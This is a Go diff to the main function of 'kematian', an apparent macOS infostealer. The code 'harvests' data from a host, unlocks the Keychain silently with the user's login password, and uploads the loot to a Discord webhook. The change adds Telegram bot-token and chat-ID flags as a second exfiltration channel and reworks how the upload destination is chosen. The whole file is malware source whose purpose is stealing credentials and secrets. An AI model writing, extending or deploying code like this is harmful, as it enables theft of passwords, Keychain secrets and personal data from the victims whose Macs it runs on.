@@ -17,9 +17,13 @@ var defaultWebhook string
 
 func main() {
 	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
+	telegramTokenFlag := flag.String("telegram-token", "", "Telegram bot token (or TELEGRAM_BOT_TOKEN)")
+	telegramChatFlag := flag.String("telegram-chat", "", "Telegram chat/channel ID (or TELEGRAM_CHAT_ID)")
 	macPasswordFlag := flag.String("mac-password", "", "macOS login password — unlocks Keychain silently (or KEMATIAN_MAC_PASSWORD)")
 	quiet := flag.Bool("quiet", false, "minimal console output")
 	flag.Parse()
+
+	uploadCfg := resolveUploadConfig(*webhookFlag, *telegramTokenFlag, *telegramChatFlag)
 
 	macPassword := strings.TrimSpace(*macPasswordFlag)
 	if macPassword == "" {
@@ -38,18 +42,8 @@ func main() {
 		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
 	}
 
-	webhook := strings.TrimSpace(*webhookFlag)
-	if webhook == "" {
-		webhook = strings.TrimSpace(os.Getenv("DISCORD_WEBHOOK_URL"))
-	}
-	if webhook == "" {
-		webhook = strings.TrimSpace(os.Getenv("KEMATIAN_WEBHOOK_URL"))
-	}
-	if webhook == "" {
-		webhook = strings.TrimSpace(defaultWebhook)
-	}
-	if webhook == "" {
-		log.Fatal("discord webhook required: -webhook, DISCORD_WEBHOOK_URL, KEMATIAN_WEBHOOK_URL, or build-time defaultWebhook")
+	if !uploadCfg.valid() {
+		log.Fatal("upload destination required: configure Discord webhook and/or Telegram bot token + chat id at build time or via flags/env")
 	}
 
 	hostname, _ := os.Hostname()
@@ -58,7 +52,7 @@ func main() {
 	}
 
 	if !*quiet {
-		log.Printf("[kematian] starting harvest on %s (%s/%s)", hostname, runtime.GOOS, runtime.GOARCH)
+		log.Printf("[kematian] starting harvest on %s (%s/%s) — upload via %s", hostname, runtime.GOOS, runtime.GOARCH, uploadDestLabel(uploadCfg))
 	}
 
 	payload, err := runHarvest(hostname)
@@ -66,7 +60,7 @@ func main() {
 		log.Fatalf("[kematian] harvest failed: %v", err)
 	}
 
-	if err := uploadAllHarvest(webhook, hostname, payload, *quiet); err != nil {
+	if err := uploadAllHarvest(uploadCfg, hostname, payload, *quiet); err != nil {
 		log.Fatalf("[kematian] upload failed: %v", err)
 	}
 
